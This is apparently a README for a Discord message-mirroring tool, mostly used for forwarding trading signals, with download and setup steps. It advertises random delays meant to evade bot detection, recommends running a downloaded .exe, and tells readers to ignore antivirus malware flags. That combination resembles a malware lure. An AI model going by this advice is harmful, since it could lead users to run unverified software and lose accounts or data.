# ⚡ Zenith Automator | Discords Best Message Automator

**Zenith Automator** is a high-speed Discord message mirroring tool. It is designed to automatically monitor a specific private source channel and instantly forward files, text, and visual charts to one or multiple destination channels or servers. 


Whether you are copying crypto/stock trading signals or managing community announcements, Zenith Automator handles real-time cross-channel communication seamlessly.

## ✨ Key Features

- **🚀 Multi-Channel Mirroring**: Forward a single source alert or message to an unlimited number of destination channels simultaneously.
- **🕒 Human-Jitter Timing (Anti-Detection)**: Implements a random 1–5 second "fuzzing" delay on top of your base cooldown to mimic human typing behavior and bypass automated bot detection flags.
- **🖼️ Chart & Asset Forwarding**: Automatically detects, clones, and forwards image attachments, graphics, and trading charts along with the text content.
- **🌙 Custom Dark GUI (Zenith Dark Edition)**: Designed with a fully custom, frameless, dark-themed graphical user interface, custom title bar, and professional UI.
- **🔋 System Tray Integration**: Minimize the controller app to the Windows system tray to keep it running silently in the background.
- **🔝 Always-on-Top Mode**: Keeps the GUI controller visible on your desktop at all times so you can monitor cycles and real-time status updates.
- **💻 Interactive Developer Console**: Features an integrated terminal for real-time logging, connection debugging, and command-line control.


<p align="center">
  <img src="https://github.com/user-attachments/assets/09216ddf-10df-471d-8a84-edcf2defde03" width="550" alt="Zenith Automator Discord Message Mirroring GUI App and Trading Alert Forwarder Console Interface">
</p>



## 🛠️ Installation & Prerequisites

### Technical Requirements
- **Python 3.10+** (Only required if running from source)
- Required Libraries: `pip install requests Pillow pystray`

### Setup Guide

#### Method 1 (Recommended)
1. Download the standalone executable by clicking [here](https://github.com/professionalskiddar/Zenith-Automator/releases/download/Download/ZenithAutomator.exe).
2. Launch the application.

#### Method 2 (Advanced / Run from Source)
1. **Clone the repository**:
   ```bash
   git clone https://github.com/professionalskiddar/Zenith-Automator
   cd Zenith-Automator
   ```
2. **Launch the GUI application**:
   ```bash
   python main.py
   ```



## 📖 How to Use Zenith Automator

### 1. Initial Connection & Configuration
- **User Agent:** The application user-agent field comes pre-filled. Keep the default settings unless you are an advanced user. Click the **Info** button on the setup screen for advanced network details.
- **Mirroring Channel (Source):** This is your main tracking repository channel used for your message templates. Create a new personal Discord server or use an existing channel. Right-click the channel, copy the **Channel ID**, and paste it into the field. Any new message sent here will be detected and sent when the application is started.
- **Test Channel (Optional):** Use this field to safely route a sample message via the **Test Message** button to verify your configuration before going live.

### 2. Adding Destination Channels
- Locate the channel target input field positioned right below the interactive console. 
- Input your desired destination **Discord Channel ID** to add it to the active forwarding list. *(Note: The tool requires at least one initial message in your source mirroring channel to activate the sync).*

### 3. Execution
- Click the **Start** button to engage the background listener loop. 
- *Note: Open-source safety notice—this code is 100% transparent and open-source. Because it interacts with system UI windows and background threads, Windows Defender may occasionally throw a false-positive malware flag during initial setup.*

Please consider starring this if it helped you in anyway to help other people find it, thanks!

